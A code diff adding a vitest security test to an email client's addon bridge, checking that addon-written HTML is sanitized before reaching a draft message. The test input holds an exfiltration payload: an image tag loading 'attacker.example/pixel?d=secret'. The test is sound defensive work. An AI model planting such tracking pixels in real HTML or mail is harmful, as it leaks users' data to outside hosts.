@@ -3,8 +3,14 @@ import type { AddonBridge } from "../../../../logic/Addons/Bridge/AddonBridge";
 import type { Grant } from "../../../../logic/Addons/Bridge/Grant";
 import { HandleBudget } from "../../../../logic/Addons/Bridge/HandleTable";
 import type { AddonGroup } from "../../../../logic/Addons/API/addon";
+import { sanitizeHTMLWithoutLoading } from "../../../../logic/util/convertHTML";
 import { ArrayColl } from "svelte-collections";
 import { afterEach, describe, expect, test, vi } from "vitest";
+
+// DOMPurify needs a real browser. The Electron security test checks the real sanitizer.
+vi.mock("../../../../logic/util/convertHTML", () => ({
+  sanitizeHTMLWithoutLoading: vi.fn((html: string) => "<p>sanitized</p>" + html.length),
+}));
 
 let cleanups: (() => void)[] = [];
 afterEach(() => {
@@ -205,6 +211,20 @@ describe("Arguments and writes", () => {
     expect(await errorOf(addon, { op: "set", h: write.h, m: "subject", v: "Changed" })).toBeUndefined();
     expect(message.subject).toBe("Changed");
     expect(await errorOf(addon, { op: "set", h: write.h, m: "isRead", v: true })).toContain("may not change");
+  });
+
+  test("HTML that the addon writes reaches the app object only sanitized", async () => {
+    let { bridge, addon } = rawSetup(["message", "mail", "mail.compose"]);
+    let draft = new TMessage();
+    let write = await give(bridge, addon, draft, bridge.newGrant(["message", "mail", "mail.compose"]));
+    let evil = `<img src="https://attacker.example/pixel?d=secret">`;
+    expect(await errorOf(addon, { op: "set", h: write.h, m: "html", v: evil })).toBeUndefined();
+    expect(sanitizeHTMLWithoutLoading).toHaveBeenLastCalledWith(evil);
+    expect(draft.html).toBe(vi.mocked(sanitizeHTMLWithoutLoading).mock.results.at(-1).value);
+    expect(draft.html).not.toContain("attacker.example");
+    // Plain strings aren't HTML
+    expect(await errorOf(addon, { op: "set", h: write.h, m: "subject", v: evil })).toBeUndefined();
+    expect(draft.subject).toBe(evil);
   });
 
   test("Type confusion: a folder handle where a person is expected", async () => {
